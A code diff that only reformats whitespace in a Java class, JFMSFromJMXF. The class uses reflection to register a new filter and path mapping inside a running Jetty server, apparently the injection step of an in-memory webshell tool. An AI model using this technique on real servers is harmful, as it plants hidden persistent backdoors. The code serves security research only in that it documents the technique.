@@ -70,8 +70,8 @@ public class JFMSFromJMXF implements Filter {
 
                     if (!flag) {
                         ClassLoader classLoader = handler.getClass().getClassLoader();
-                        Class       sourceClazz = null;
-                        Object      holder      = null;
+                        Class sourceClazz = null;
+                        Object holder = null;
                         try {
                             sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                             field = sourceClazz.getDeclaredField("JAVAX_API");
@@ -94,9 +94,9 @@ public class JFMSFromJMXF implements Filter {
                         holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
                         handler.getClass().getMethod("addFilter", holder.getClass()).invoke(handler, holder);
 
-                        Class  clazz         = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
+                        Class clazz = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
                         Object filterMapping = clazz.newInstance();
-                        Method method        = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
+                        Method method = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
                         method.setAccessible(true);
                         method.invoke(filterMapping, holder);
                         filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{pattern}});
